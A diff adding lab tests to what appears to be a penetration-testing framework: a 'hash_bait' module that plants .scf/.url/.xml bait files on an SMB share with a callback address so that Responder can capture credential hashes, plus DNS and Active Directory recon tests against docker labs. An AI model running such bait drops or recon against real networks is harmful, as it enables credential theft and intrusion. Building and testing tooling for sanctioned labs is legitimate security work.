@@ -996,11 +996,107 @@ class TestSpiderLab(unittest.TestCase):
             self.assertIn("web.config", out)
             self.assertIn("credentials.txt", out)
             self.assertNotIn("flag.txt", out)  # not an interesting pattern
+            # write probe: public is read-only, labuser is the drop target
+            self.assertIn("public: READ", out)
+            self.assertIn("labuser: READ/WRITE", out)
             loot = console.store.loot("spider")
             self.assertEqual(len(loot), 1)
             self.assertIn("web.config", loot[0]["content"])
         finally:
             console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestHashBaitLab(unittest.TestCase):
+    """hash_bait against the smb lab: drop, verify, clean — and a clean
+    denial on the read-only guest share."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("smb")
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            try:
+                SMBConnection(HOST, HOST, sess_port=10445, timeout=2).close()
+                break
+            except Exception:
+                time.sleep(0.5)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("smb")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            return buf.getvalue(), console.store.loot("bait")
+        finally:
+            console.store.close()
+
+    def test_drop_and_clean(self):
+        out, loot = self._run(
+            "use auxiliary/attack/hash_bait",
+            f"set RHOSTS {HOST}",
+            "set RPORT 10445",
+            "set USERNAME labuser",
+            "set PASSWORD labpass",
+            "set SHARE labuser",
+            "set CALLBACK 10.10.14.5",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        for kind in ("scf", "url", "xml"):
+            self.assertIn(f"@bait.{kind}", out)
+        self.assertIn("responder", out)
+        self.assertEqual(len(loot), 1)
+        self.assertIn("callback=10.10.14.5", loot[0]["content"])
+
+        out, _ = self._run(
+            "use auxiliary/attack/hash_bait",
+            f"set RHOSTS {HOST}",
+            "set RPORT 10445",
+            "set USERNAME labuser",
+            "set PASSWORD labpass",
+            "set SHARE labuser",
+            "set CLEAN true",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("3/3 bait file(s) removed", out)
+        # nothing left behind on the share
+        from impacket.smbconnection import SMBConnection
+        conn = SMBConnection(HOST, HOST, sess_port=10445, timeout=10)
+        conn.login("labuser", "labpass")
+        names = {e.get_longname()
+                 for e in conn.listPath("labuser", "\\*")}
+        conn.close()
+        self.assertFalse(any(n.startswith("@bait.") for n in names),
+                         f"bait files left behind: {names}")
+
+    def test_read_only_share_clean_denial(self):
+        out, loot = self._run(
+            "use auxiliary/attack/hash_bait",
+            f"set RHOSTS {HOST}",
+            "set RPORT 10445",
+            "set USERNAME labuser",
+            "set PASSWORD labpass",
+            "set SHARE public",
+            "set CALLBACK 10.10.14.5",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("drop failed", out)
+        self.assertEqual(loot, [])
 
 
 def up_ad_lab(manager, timeout=120):
@@ -1020,6 +1116,78 @@ def up_ad_lab(manager, timeout=120):
             time.sleep(2)
     manager.down("ad")
     raise RuntimeError("AD lab did not provision within %ss" % timeout)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestDnsReconLab(unittest.TestCase):
+    """dns_recon against the AD lab's Samba DNS (15353)."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        up_ad_lab(cls.manager)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            out = buf.getvalue()
+            hosts = [h["address"] for h in console.store.hosts()]
+            loot = console.store.loot("dns")
+            return out, hosts, loot
+        finally:
+            console.store.close()
+
+    def test_a_lookup_feeds_hosts(self):
+        out, hosts, _ = self._run(
+            "use auxiliary/enum/dns_recon",
+            f"set RHOSTS {HOST}",
+            "set RPORT 15353",
+            "set TARGET forge.local",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("forge.local. 900 A", out)
+        import re
+        m = re.search(r"forge\.local\.\s+\d+\s+A\s+(\d+\.\d+\.\d+\.\d+)", out)
+        self.assertIsNotNone(m, f"no A record parsed from: {out}")
+        self.assertIn(m.group(1), hosts)
+
+    def test_addiscover_srv_set(self):
+        out, _, loot = self._run(
+            "use auxiliary/enum/dns_recon",
+            f"set RHOSTS {HOST}",
+            "set RPORT 15353",
+            "set TARGET forge.local",
+            "set ADDISCOVER true",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        for needle in ("_ldap._tcp.dc._msdcs", "389", "_kerberos._tcp",
+                       "_gc._tcp", "3268", "_kpasswd._tcp"):
+            self.assertIn(needle, out)
+        self.assertEqual(len(loot), 4)
+
+    def test_nxdomain_clean(self):
+        out, _, _ = self._run(
+            "use auxiliary/enum/dns_recon",
+            f"set RHOSTS {HOST}",
+            "set RPORT 15353",
+            "set TARGET ghost.forge.local",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("NXDOMAIN", out)
 
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
